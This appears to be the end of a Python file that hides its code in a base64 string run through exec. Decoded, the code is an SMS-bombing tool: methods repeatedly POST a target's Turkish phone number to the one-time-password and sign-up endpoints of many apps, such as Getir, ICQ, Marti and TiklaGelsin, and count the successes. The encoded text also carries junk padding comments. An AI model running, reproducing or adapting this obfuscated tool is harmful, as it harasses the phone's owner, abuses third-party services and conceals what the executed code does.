AgIHNlbGYuYWRldCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVFJFRF9FWH1bLV0ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsXPEsXohIHtzZWxmLnBob25lfSAtLT4gbW9iaWxlYXBpdjIudGF6aS50ZWNoIikKCiAgICBkZWYgS2ltR2Ioc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly8zdXB0emxha3dpLmV4ZWN1dGUtYXBpLmV1LXdlc3QtMS5hbWF6b25hd3MuY29tOjQ0My9hcGkvYXV0aC9zZW5kLW90cCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGpzb249eyJtc2lzZG4iOiBmIjkwe3NlbGYucGhvbmV9In0pCiAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgcHJpbnQoCiAgICAgICAgICAgICAgICAgICAgZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfVsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IDN1cHR6bGFrd2kuZXhlY3V0ZS1hcGkuZXUtd2VzdC0xLmFtYXpvbmF3cy5jb20iKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludCgKICAgICAgICAgICAgICAgIGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IDN1cHR6bGFrd2kuZXhlY3V0ZS1hcGkuZXUtd2VzdC0xLmFtYXpvbmF3cy5jb20iKQoKICAgIGRlZiBTdWlzdGUoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly9zdWlzdGUuY29tOjQ0My9hcGkvYXV0aC9jb2RlIgogICAgICAgICAgICBoZWFkZXJzID0geyJBY2NlcHQiOiAiYXBwbGljYXRpb24vanNvbiIsICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PXV0Zi04IiwKICAgICAgICAgICAgICAgICAgICAgICAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLAogICAgICAgICAgICAgICAgICAgICAgICJNb2JpbGxpdW0tRGV2aWNlLUlkIjogIjU2REI5QUM0LUY1MkItNERGMS1CMTRDLUUzOTY5MEJDNjlGQyIsCiAgICAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAic3Vpc3RlLzEuNi4xNiAoY29tLm1vYmlsbGl1bS5zdWlzdGU7IGJ1aWxkOjE0MzQ7IGlPUyAxNS43LjcpIEFsYW1vZmlyZS81LjYuNCIsCiAgICAgICAgICAgICAgICAgICAgICAgIkFjY2VwdC1MYW5ndWFnZSI6ICJlbiJ9CiAgICAgICAgICAgIGRhdGEgPSB7ImFjdGlvbiI6ICJyZWdpc3RlciIsICJnc20iOiBzZWxmLnBob25lfQogICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGhlYWRlcnM9aGVhZGVycywgZGF0YT1kYXRhKQogICAgICAgICAgICAjI2xhbMWfc2RrxLFhxZ9sc2ZrYWlzZmxhcyMjbGFsxZ9zZGvEsWHFn2xzZmthaXNmbGFzIyNsYWzFn3Nka8SxYcWfbHNma2Fpc2ZsYXMjI2xhbMWfc2RrxLFhxZ9sc2ZrYWlzZmxhcyMjbGFsxZ9zZGvEsWHFn2xzZmthaXNmbGFzIyNsYWzFn3Nka8SxYcWfbHNma2Fpc2ZsYXMjI2xhbMWfc2RrxLFhxZ9sc2ZrYWlzZmxhcyMjbGFsxZ9zZGsjxLFhxZ9sc2ZrYWlzZmxhcyMjbGFsxZ9zZGvEsWHFn2xzZmthaXNmbGFzIyNsYWzFn3Nka8SxYcWfbHNma2Fpc2ZsYXMjI2xhbMWfc2RrxLFhxZ9sc2ZrYWlzZmxhcyMjbGFsxZ9zZGvEsWHFn2xzZmthaXNmbGFzIyNsYWzFn3Nka8SxYcWfbHNma2Fpc2ZsYXMjI2xhbMWfc2RrxLFhxZ9sc2ZrYWlzZmxhcyMjbGFsxZ9zZGvEsWHFn2xzZmthaSNzZmxhcyMjbGFsxZ9zZGvEsWHFn2xzZmthaXNmbGFzIyNsYWzFn3Nka8SxYcWfbHNma2Fpc2ZsYXMjI2xhbMWfc2RrxLFhxZ9sc2ZrYWlzZmxhcyMjbGFsxZ9zZGvEsWHFn2xzZmthaXNmbGFzIyNsYWzFn3Nka8SxYcWfbHNma2Fpc2ZsYXMjI2xhbMWfc2RrxLFhxZ9sc2ZrYWlzZmxhcyMjbGFsxZ9zZGvEsWHFn2xzZmthaXNmbGFzIyNsI2FsxZ9zZGvEsWHFn2xzZmthaXNmbGFzIyNsYWzFn3Nka8SxYcWfbHNma2Fpc2ZsYXMjI2xhbMWfc2RrxLFhxZ9sc2ZrYWlzZmxhcyMjbGFsxZ9zZGvEsWHFn2xzZmthaXNmbGFzIyNsYWzFn3Nka8SxYcWfbHNma2Fpc2ZsYXMjI2xhbMWfc2RrxLFhxZ9sc2ZrYWlzZmxhcyMjbGFsxZ9zZGvEsWHFn2xzZmthaXNmbGFzIyNsYWzFn3Nka8SxI2HFn2xzZmthaXNmbGFzIyNsYWzFn3Nka8SxYcWfbHNma2Fpc2ZsYXMjI2xhbMWfc2RrxLFhxZ9sc2ZrYWlzZmxhcyMjbGFsxZ9zZGvEsWHFn2xzZmthaXNmbGFzIyNsYWzFn3Nka8SxYcWfbHNma2Fpc2ZsYXNhc2dmYXNkxZ9sYWlzbGFhc2xna2phxZ9sa2FsxZ9zZ2thxZ9sc2thc8WfbGRrYXPDp2xna2FzCiAgICAgICAgICAgICMjbGFsxZ9zZGvEsWHFn2xzZmthaXNmbGFzIyNsYWzFn3Nka8SxYcWfbHNma2Fpc2ZsYXMjI2xhbMWfc2RrxLFhxZ9sc2ZrYWlzZmxhc2FzamZsa2FzamYjI2xhbMWfc2RrxLFhxZ9sc2ZrYWlzZmxhc2Fqa3NkxZ9nYSMjbGFsxZ9zZGvEsWHFn2xzZmthaXNmbGFzxZ8KCiAgICAgICAgICAgIGlmIHIuanNvbigpWyJjb2RlIl0gPT0gImNvbW1vbi5zdWNjZXNzIjoKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRHUkVFTl9FWH1bK10ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsWzEsSEge3NlbGYucGhvbmV9IC0tPiBzdWlzdGUuY29tIikKICAgICAgICAgICAgICAgIHNlbGYuYWRldCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVFJFRF9FWH1bLV0ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsXPEsXohIHtzZWxmLnBob25lfSAtLT4gc3Vpc3RlLmNvbSIpCgogICAgIyBiaW0KICAgIGRlZiBCaW0oc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBiaW0gPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL2JpbS52ZWVzay5uZXQ6NDQzL3NlcnZpY2UvdjEuMC9hY2NvdW50L2xvZ2luIiwganNvbj17InBob25lIjogc2VsZi5waG9uZX0pCiAgICAgICAgICAgIGlmIGJpbS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUR1JFRU5fRVh9WytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gYmltLnZlZXNrLm5ldCIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IGJpbS52ZWVzay5uZXQiKQoKICAgICMgaWNxLm5ldAogICAgZGVmIEljcShzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9IGYiaHR0cHM6Ly91LmljcS5uZXQ6NDQzL2FwaS92OTAvc21zcmVnL3JlcXVlc3RQaG9uZVZhbGlkYXRpb24ucGhwP2NsaWVudD1pY3EmZj1qc29uJms9Z3UxOVBOQmJsUWpDZGJNVSZsb2NhbGU9ZW4mbXNpc2RuPSUyQjkwe3NlbGYucGhvbmV9JnBsYXRmb3JtPWlvcyZyPTc5NjM1NjE1MyZzbXNGb3JtYXRUeXBlPWh1bWFuIgogICAgICAgICAgICBoZWFkZXJzID0geyJBY2NlcHQiOiAiKi8qIiwgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLAogICAgICAgICAgICAgICAgICAgICAgICJVc2VyLUFnZW50IjogIklDUSBpT1MgI25vX3VzZXJfaWQjIGd1MTlQTkJibFFqQ2RiTVUgMjMuMS4xKDEyNDEwNikgMTUuNy43IGlQaG9uZTksNCIsCiAgICAgICAgICAgICAgICAgICAgICAgIkFjY2VwdC1MYW5ndWFnZSI6ICJlbi1VUyxlbjtxPTAuOSIsICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSJ9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICBpZiByLmpzb24oKVsicmVzcG9uc2UiXVsic3RhdHVzQ29kZSJdID09IDIwMDoKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRHUkVFTl9FWH1bK10ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsWzEsSEge3NlbGYucGhvbmV9IC0tPiB1LmljcS5uZXQiKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUUkVEX0VYfVstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiB1LmljcS5uZXQiKQoKICAgICMgZXZpZGVhLmNvCgogICAgIyBtYXJ0aS50ZWNoCiAgICBkZWYgTWFydGkoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly9jdXN0b21lci5tYXJ0aXNjb290ZXIuY29tOjQ0My92MTMvc2Nvb3Rlci9kaXNwYXRjaC9jdXN0b21lci9zaWduaW4iCiAgICAgICAgICAgIGpzb24gPSB7Im1vYmlsZVBob25lIjogc2VsZi5waG9uZSwgIm1vYmlsZVBob25lQ291bnRyeUNvZGUiOiAiOTAiLCAib25lU2lnbmFsSWQiOiAiIn0KICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPWpzb24pCiAgICAgICAgICAgIGlmIHIuanNvbigpWyJpc1N1Y2Nlc3MiXSA9PSBUcnVlOgogICAgICAgICAgICAgICAgcHJpbnQoCiAgICAgICAgICAgICAgICAgICAgZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfSAgWytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gY3VzdG9tZXIubWFydGlzY29vdGVyLmNvbSIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9ICBbLV0ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsXPEsXohIHtzZWxmLnBob25lfSAtLT4gY3VzdG9tZXIubWFydGlzY29vdGVyLmNvbSIpCgogICAgIyB0aWtsYWdlbHNpbi5jb20KICAgIGRlZiBUaWtsYUdlbHNpbihzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL3N2Yy5hcHBzLnRpa2xhZ2Vsc2luLmNvbTo0NDMvdXNlci9ncmFwaHFsIgogICAgICAgICAgICBoZWFkZXJzID0geyJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsICJYLU1lcmNoYW50LVR5cGUiOiAiMCIsICJBY2NlcHQiOiAiKi8qIiwKICAgICAgICAgICAgICAgICAgICAgICAiQXBwdmVyc2lvbiI6ICIyLjQuMSIsICJBY2NlcHQtTGFuZ3VhZ2UiOiAiZW4tVVMsZW47cT0wLjkiLCAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLAogICAgICAgICAgICAgICAgICAgICAgICJYLU5vLUF1dGgiOiAidHJ1ZSIsICJVc2VyLUFnZW50IjogIlRpa2xhR2Vsc2luLzgwOSBDRk5ldHdvcmsvMTMzNS4wLjMuMiBEYXJ3aW4vMjEuNi4wIiwKICAgICAgICAgICAgICAgICAgICAgICAiWC1EZXZpY2UtVHlwZSI6ICIyIn0KICAgICAgICAgICAganNvbiA9IHsib3BlcmF0aW9uTmFtZSI6ICJHRU5FUkFURV9PVFAiLAogICAgICAgICAgICAgICAgICAgICJxdWVyeSI6ICJtdXRhdGlvbiBHRU5FUkFURV9PVFAoJHBob25lOiBTdHJpbmcsICRjaGFsbGVuZ2U6IFN0cmluZywgJGRldmljZVVuaXF1ZUlkOiBTdHJpbmcpIHtcbiAgZ2VuZXJhdGVPdHAocGhvbmU6ICRwaG9uZSwgY2hhbGxlbmdlOiAkY2hhbGxlbmdlLCBkZXZpY2VVbmlxdWVJZDogJGRldmljZVVuaXF1ZUlkKVxufVxuIiwKICAgICAgICAgICAgICAgICAgICAidmFyaWFibGVzIjogeyJjaGFsbGVuZ2UiOiAiM2Q2ZjlmZjktODZjZS00YmYzLThiYTktNGE4NWNhOTc1ZTY4IiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJkZXZpY2VVbmlxdWVJZCI6ICI3MjA5MzJENS00N0JELTQ2Q0QtQTRCOC0wODZFQzQ5RjgxQUIiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInBob25lIjogZiIrOTB7c2VsZi5waG9uZX0ifX0KICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBoZWFkZXJzPWhlYWRlcnMsIGpzb249anNvbikKICAgICAgICAgICAgaWYgci5qc29uKClbImRhdGEiXVsiZ2VuZXJhdGVPdHAiXSA9PSBUcnVlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfSAgWytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gc3ZjLmFwcHMudGlrbGFnZWxzaW4uY29tIikKICAgICAgICAgICAgICAgIHNlbGYuYWRldCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVFJFRF9FWH0gIFstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiBzdmMuYXBwcy50aWtsYWdlbHNpbi5jb20iKQoKICAgICMgdGFzaW1hY2ltLmNvbQoKICAgICMgeXVmZmkuY28KICAgIGRlZiBZdWZmaShzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL2FwaS55dWZmaS5jby9hcGkvcGFyZW50L2xvZ2luL3VzZXIiCiAgICAgICAgICAgIGpzb24gPSB7InBob25lIjogc2VsZi5waG9uZSwgImt2a2siOiBUcnVlfQogICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGpzb249anNvbikKICAgICAgICAgICAgaWYgci5qc29uKClbInN1Y2Nlc3MiXSA9PSBUcnVlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfSAgWytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gYXBpLnl1ZmZpLmNvIikKICAgICAgICAgICAgICAgIHNlbGYuYWRldCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVFJFRF9FWH0gIFstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiBhcGkueXVmZmkuY28iKQoKICAgICMgZ2V0aXIKICAgIGRlZiBnZXRpcihzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL2dldGlyLmNvbS8iCiAgICAgICAgICAgIGpzb24gPSB7ImNvdW50cnlDb2RlIjogIjkwIiwgImdzbSI6IHNlbGYucGhvbmV9CiAgICAgICAgICAgIHdtZiA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPWpzb24pCiAgICAgICAgICAgIGlmIHdtZi5zdGF0dXNfY29kZSA9PSAyMDI6CiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUR1JFRU5fRVh9ICBbK10ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsWzEsSEge3NlbGYucGhvbmV9IC0tPiBnZXRpci5jb20iKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgoKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVFJFRF9FWH0gIFstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0="
exec(base64.b64decode(siktirgit).decode('utf-8'))
